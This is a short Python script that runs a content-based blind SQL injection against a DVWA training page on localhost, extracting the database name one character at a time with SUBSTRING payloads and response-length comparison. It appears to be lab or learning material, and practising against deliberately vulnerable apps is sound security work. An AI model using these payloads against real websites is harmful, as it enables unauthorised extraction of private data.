from core.http_engine import HTTPEngine
import string

# Target DVWA blind SQL page
url = "http://localhost:8081/vulnerabilities/sqli_blind/"

engine = HTTPEngine(url)

# Characters to test
charset = string.ascii_lowercase + string.digits

print("\nStarting Content-Based Blind SQL Injection...\n")

# Get baseline TRUE response length
true_test = engine.get({
    "id": "1' AND 1=1 #",
    "Submit": "Submit"
})

true_length = true_test["length"]

print("Baseline TRUE length:", true_length)
print("\nExtracting database name:\n")

database_name = ""

for position in range(1, 6):  # DVWA database = 4 letters
    print("Testing position", position)

    for char in charset:

        payload = f"1' AND SUBSTRING(database(),{position},1)='{char}' #"

        res = engine.get({
            "id": payload,
            "Submit": "Submit"
        })

        if res["length"] == true_length:
            print("Found:", char)
            database_name += char
            break

print("\nDatabase name extracted:", database_name)
